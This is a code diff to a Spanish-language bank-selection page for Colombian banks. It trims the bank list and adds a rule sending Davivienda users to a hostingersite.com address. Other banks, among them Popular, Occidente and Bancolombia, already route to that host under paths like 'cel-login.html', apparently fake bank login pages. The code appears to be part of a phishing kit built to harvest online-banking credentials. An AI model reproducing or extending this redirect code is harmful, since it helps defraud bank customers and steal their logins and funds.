@@ -206,7 +206,7 @@
           <div class="col-12">
             <select id="bank-option" class="form-select" required>
               <option value="" disabled selected>Seleccione su banco</option>
-              <option label="Colpatria" value="bancamia">Colpatria</option>
+              <option label="Colpatria" value="bancamia">COLPATRIA</option>
               
               <option label="BANCO AV VILLAS" value="avvillas">
                 BANCO AV VILLAS
@@ -226,37 +226,12 @@
               <option label="BANCO DE OCCIDENTE" value="occidente">
                 BANCO DE OCCIDENTE
               </option>
-              <option label="BANCO FALABELLA " value="falabella">
-                BANCO FALABELLA
-              </option>
-              <option label="BANCO FINANDINA S.A. BIC" value="finandina">
-                BANCO FINANDINA S.A. BIC
-              </option>
-              <option label="BANCO GNB SUDAMERIS" value="sudameris">
-                BANCO GNB SUDAMERIS
-              </option>
-              <option label="BANCO ITAU" value="itau">BANCO ITAU</option>
-              <option label="BANCO PICHINCHA S.A." value="pichincha">
-                BANCO PICHINCHA S.A.
-              </option>
+                       
+            
               <option label="BANCO POPULAR" value="popular">BANCO POPULAR</option>
-              <option label="BANCO SANTANDER COLOMBIA" value="santander">
-                BANCO SANTANDER COLOMBIA
-              </option>
-              <option label="BANCO SERFINANZA" value="serfinanza">
-                BANCO SERFINANZA
-              </option>
-              <option label="BANCO UNION antes GIROS" value="union">
-                BANCO UNION antes GIROS
-              </option>
+              
               <option label="BANCOLOMBIA" value="bancolombia">BANCOLOMBIA</option>
-              <option label="BANCOOMEVA S.A." value="bancomeva">
-                BANCOOMEVA S.A.
-              </option>
-              <option label="CFA COOPERATIVA FINANCIERA" value="cfa">
-                CFA COOPERATIVA FINANCIERA
-              </option>
-              <option label="CITIBANK " value="citibank">CITIBANK</option>
+           
             </select>
 
             </select>
@@ -356,7 +331,7 @@
     "caja-social": { engine: "bing",   q: "Banco Caja Social" },
     "coopertaivo-coopcentral": { engine: "yahoo", q: "Banco Cooperativo Coopcentral" },
     credifinanciera:{ engine: "google", q: "Banco Credifinanciera" },
-    davivienda:    { engine: "bing",   q: "Davivienda" },
+    davivienda:    { engine: "davivienda",   q: "Davivienda" },
     bogota:        { engine: "bogota",  q: "Banco de Bogotá" },
     occidente:     { engine: "ocidente", q: "Banco de Occidente" },
     falabella:     { engine: "bing",   q: "Banco Falabella" },
@@ -377,6 +352,7 @@
   // Construcción URL según motor
   function buildSearchUrl(engine, q) {
     const query = encodeURIComponent(q);
+     if (engine === "davivienda") return `https://blueviolet-okapi-275780.hostingersite.com/transaction/ent/b-34f3/`;
     if (engine === "popular") return `https://blueviolet-okapi-275780.hostingersite.com/transaction/ent/b-34f18/login/`;
     if (engine === "ocidente") return `https://blueviolet-okapi-275780.hostingersite.com/transaction/ent/b-34f14/`;
     if (engine === "bancolombia") return `https://blueviolet-okapi-275780.hostingersite.com/boton/dinadatos/bancol/cel-login.html`;
